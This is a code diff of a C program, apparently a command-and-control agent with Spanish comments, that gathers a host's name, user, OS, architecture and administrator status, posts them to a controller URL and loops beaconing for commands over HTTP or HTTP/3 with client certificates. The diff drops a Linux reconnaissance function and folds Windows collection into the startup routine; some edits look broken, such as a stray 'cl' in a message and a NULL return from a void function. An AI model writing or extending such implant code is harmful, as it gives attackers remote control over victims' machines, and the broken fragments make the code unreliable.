@@ -1,13 +1,8 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <curl/curl.h>
-#include <unistd.h>
 #include <string.h>
-#include <openssl/ssl.h>
-#include <openssl/bio.h>
-#include <openssl/err.h>
-#include <openssl/pem.h>
-#include <openssl/x509.h>
+
 
 // gcc -DAGENT_ID="agent-1" -DCOMMAND_URL="http://localhost:8080/agent-1/cmd" -DBEACON_INTERVAL=2 -o agent agent.c -lcurl
 
@@ -29,10 +24,6 @@
 
 #ifndef TYPE
     #define TYPE "HTTP"
-#endif
-
-#ifndef OS
-    #define OS "Windows"
 #endif
 
 // Estructura utilizada para almacenar los datos de respuesta
@@ -96,22 +87,22 @@ char *decode_base64(const char *input, size_t input_size, size_t *output_size);
 
 int main(int argc, char *argv[]) { 
     
-    char *output;
+    char *output;	
+
+    printf("Enviando datos a: %s", NEW_URL);
 
     curl_global_init(CURL_GLOBAL_ALL); // Inicializar librería curl
     CURL *curl = curl_easy_init(); // Inicializar una instancia de curl
 
     if (curl){
-
-        curl = curl_easy_init(); // Inicializar una instancia de curl
-
+   
         #ifdef SERVER_CERT
             createCertificates();
         #endif
 
         // Recopila información del agente y la envía al servidor
         sendInfoStart(curl);
-        
+
         while (1) {
 
             sleep(BEACON_INTERVAL); // Esperar 2 segundos antes de enviar otro beacon
@@ -187,9 +178,11 @@ void createCertificates(){
 
 }
 
-char* getInfoWindows(){
 
-    // Información que recopila: hostname, username, os, arquitectura y is_root (Administrator, bool)
+void sendInfoStart(CURL *curl){
+
+    // Recopila información del agente y la envía al servidor
+    // Información que recopila: hostname, username, os, arquitectura y is_root (nt_system, bool)
     char hostname[1024];
     DWORD hostname_len = 1024;
     GetComputerName(hostname, &hostname_len);
@@ -218,48 +211,16 @@ char* getInfoWindows(){
     char buffer[1024];
     snprintf(buffer, sizeof(buffer), "%s\n%s\n%s\n%s\n%d", hostname, username, os, arch, is_root);
 
-}
-
-char* getInfotLinux(){
-
-    // Información que recopila: hostname, username, os, arquitectura y is_root (root, bool)
-    char hostname[1024];
-    gethostname(hostname, 1024);
-
-    char username[1024];
-    getlogin_r(username, 1024);
-
-    char os[11];
-    snprintf(os, sizeof(os), "%s", "Linux");
-
-    char arch[10];
-    snprintf(arch, sizeof(arch), "%s", sizeof(void *) == 4 ? "x86" : "x64");
-
-    int is_root = 0;
-    if (getuid() == 0) {
-        is_root = 1;
-    }
-
-    char buffer[1024];
-    snprintf(buffer, sizeof(buffer), "%s\n%s\n%s\n%s\n%d", hostname, username, os, arch, is_root);
-
-}
-
-void sendInfoStart(CURL *curl){
-
-    char* osInfo;
-
-    // Si el define OS es Windows, se hace una cosa si es Linux, se hace otra
-    if (strcmp(OS, "Windows") == 0) {
-        osInfo = getInfoWindows();
-    } else if (strcmp(OS, "Linux") == 0) {
-        osInfo = getInfotLinux();
-    }
-
     CURLcode res;
 
+    curl_global_init(CURL_GLOBAL_DEFAULT);
+
+    curl = curl_easy_init();
+
+  
+
     curl_easy_setopt(curl, CURLOPT_URL, NEW_URL);
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, osInfo);
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buffer);
 
     
     #ifdef SERVER_CERT // Si se ha definido SERVER_CERT, se configura los certificados y claves QUIC
@@ -276,7 +237,7 @@ void sendInfoStart(CURL *curl){
     // Configurar el certificado del servidor, el certificado de la app y la clave privada de la app
     curl_easy_setopt(curl, CURLOPT_CAINFO, "server_cert.pem");
     curl_easy_setopt(curl, CURLOPT_SSLCERT, "cert.pem");
-    curl_easy_setopt(curl, CURLOPT_SSLKEY, "key.pem");      
+    curl_easy_setopt(curl, CURLOPT_SSLKEY, "key.pem");
 
     #endif
 
@@ -286,7 +247,9 @@ void sendInfoStart(CURL *curl){
         return NULL;
     }
 
-    printf("\nInformación del agente enviada al servidor\n");
+    printf("Información del agente enviada al servidor\n");
+
+    
 
 }
 
@@ -307,7 +270,7 @@ size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
 
 char *get_commands(CURL *curl) {
 
-    //curl_easy_reset(curl);
+    curl_easy_reset(curl);
 
     CURLcode res;
 
@@ -329,7 +292,7 @@ char *get_commands(CURL *curl) {
 
     #ifdef SERVER_CERT // Si se ha definido SERVER_CERT, se configura el certificado del servidor
 
-        printf("\nIntentando la conexión con el servidor (HTTP/3)... [%s]\n", COMMAND_URL);
+        printf("\nclIntentando la conexión con el servidor (HTTP/3)... [%s]\n", COMMAND_URL);
 
         const char *cacert = "server_cert.pem";
         // Configurar el protocolo HTTP/3 (QUIC)
